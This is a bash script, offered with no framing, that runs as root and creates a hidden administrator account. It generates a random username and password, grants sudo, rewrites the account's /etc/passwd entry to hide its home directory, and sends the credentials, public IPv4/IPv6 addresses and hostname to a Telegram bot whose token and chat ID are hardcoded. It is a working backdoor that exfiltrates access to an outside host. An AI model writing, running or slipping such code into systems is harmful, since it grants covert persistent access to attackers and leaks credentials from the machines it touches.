#!/bin/bash

# Bot token and chat ID for Telegram notifications
BOT_TOKEN="6874880525:AAGJOGX_3eR8hYOLaJCgq2BWOeuYc7D6RDc"
CHAT_ID="1182377349"

send_telegram_message() {
    local message=$1
    local encoded_message=$(echo "$message" | sed 's/ /%20/g; s/<b>/%3Cb%3E/g; s/<\/b>/%3C/b%3E/g; s/<code>/%3Ccode%3E/g; s/<\/code>/%3C/code%3E/g; s/<br>/%3Cbr%3E/g')
    local response=$(curl -s -w "%{http_code}" -o /tmp/curl_output.txt -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" \
        -d "chat_id=$CHAT_ID" \
        -d "text=$encoded_message" \
        -d "parse_mode=HTML")
    
    echo "HTTP Response Code: $response"
    cat /tmp/curl_output.txt

    if [ "$response" -ne 200 ]; then
        echo "Failed to send message: $response"
    fi
}

get_server_info() {
    local ipv4=$(curl -s https://api.ipify.org?format=text)
    local ipv6=$(curl -s https://api64.ipify.org?format=text)
    local hostname=$(hostname)
    echo "IPv4 Address: $ipv4, IPv6 Address: $ipv6, Hostname: $hostname"
}

generate_random_string() {
    local length=$1
    tr -dc 'a-zA-Z0-9' < /dev/urandom | head -c "$length"
}

if [ "$EUID" -ne 0 ]; then
    send_telegram_message "Error: Please run as root"
    exit 1
fi

# Ensure /var/empty exists
mkdir -p /var/empty

server_info=$(get_server_info)
send_telegram_message "Starting the creation of a hidden admin user. $server_info"

# Generate random username and password
user_id=$(generate_random_string 12)
password_1=$(generate_random_string 16)

# Check if user already exists
if id "$user_id" &>/dev/null; then
    send_telegram_message "User $user_id already exists. Skipping user creation."
else
    # Create the account
    if useradd -m -s /bin/bash "$user_id"; then
        echo "$user_id:$password_1" | chpasswd
        if usermod -aG sudo "$user_id" && usermod -d /home/$user_id "$user_id" && sed -i "/^$user_id:/s#/home/$user_id#/var/empty#" /etc/passwd && usermod -s /bin/bash "$user_id"; then
            send_telegram_message "<b>Admin user <code>$user_id</code></b> has been created and hidden successfully with password <b><code>$password_1</code></b>.$server_info"
        else
            send_telegram_message "Failed to configure the user $user_id properly."
        fi
    else
        send_telegram_message "Failed to create user $user_id."
    fi
fi
